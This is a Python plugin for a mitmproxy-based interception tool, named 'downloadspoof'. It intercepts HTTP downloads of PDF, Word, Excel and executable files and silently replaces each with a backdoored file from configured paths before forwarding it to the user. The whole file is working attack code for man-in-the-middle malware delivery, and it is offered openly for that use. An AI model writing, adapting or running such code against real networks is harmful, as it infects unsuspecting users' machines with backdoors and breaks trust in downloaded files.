from os import path
from mitmproxy.models import decoded
from plugins.plugin import PluginTemplate


exe_mimetypes = ['application/octet-stream', 'application/x-msdownload', 
'application/exe', 'application/x-exe', 'application/dos-exe', 'vms/exe',
'application/x-winexe', 'application/msdos-windows', 'application/x-msdos-program']

class downloadspoof(PluginTemplate):
    name    = 'downloadspoof'
    version = '1.0'
    desc    = 'Replace files being downloaded via HTTP with malicious versions.'
    def __init__(self):
        self.payloads = {
        'application/pdf': self.config.get_setting('downloadspoof','backdoorPDFpath'),
        'application/msword': self.config.get_setting('downloadspoof','backdoorWORDpath'),
        'application/x-msexcel' : self.config.get_setting('downloadspoof','backdoorXLSpath'),
        }
        for mime in exe_mimetypes:
            self.payloads[mime] = self.config.get_setting('downloadspoof','backdoorExePath')

    def request(self, flow):
        pass

    def response(self, flow):
        try:
            # for another format file types
            content = flow.response.headers['Content-Type']
            if content in self.payloads:
                if path.isfile(self.payloads[content]):
                    with decoded(flow.response): 
                        self.log.info('[downloadspoof]:: URL: {}'.format(flow.request.url))
                        self.log.info("[downloadspoof]:: Replaced file of mimtype {} with malicious version".format(content))
                        flow.response.content = open(self.payloads[content],'rb').read()
                        self.log.info('[downloadspoof]:: Patching complete, forwarding to user...')
                    return 
                self.log.info('[downloadspoof]:: {}, Error Path file not found\n'.format(self.payloads[content]))
        except Exception as e:
            pass